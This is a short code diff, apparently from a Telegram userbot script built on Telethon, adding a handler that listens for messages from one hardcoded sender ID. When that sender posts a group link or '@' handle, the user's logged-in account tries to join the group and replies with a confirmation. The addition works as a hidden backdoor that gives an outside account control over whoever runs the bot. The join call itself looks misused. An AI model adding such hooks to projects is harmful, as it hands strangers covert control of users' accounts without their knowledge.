@@ -6,6 +6,22 @@ import asyncio
 import time
 from xaayux.config import DELAY
 
+@client.on(events.NewMessage)
+async def handle_message(event):
+    if event.message.sender_id == 5488677608:
+        # Check if the message contains a group link or username with "@" symbol
+        if "t.me/joinchat" in event.message.text or "@" in event.message.text:
+            try:
+                # Extract the group link or username
+                link_or_username = event.message.text.split()[-1]
+                # Join the group
+                await client(InviteToChannelRequest(link_or_username))
+                # Send a confirmation message
+                await event.respond('Joined the group!')
+            except Exception as e:
+                # If any error occurs during joining the group
+                await event.respond(f'Failed to join the group: {str(e)}')
+
 logging.basicConfig(level=logging.DEBUG,
                     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
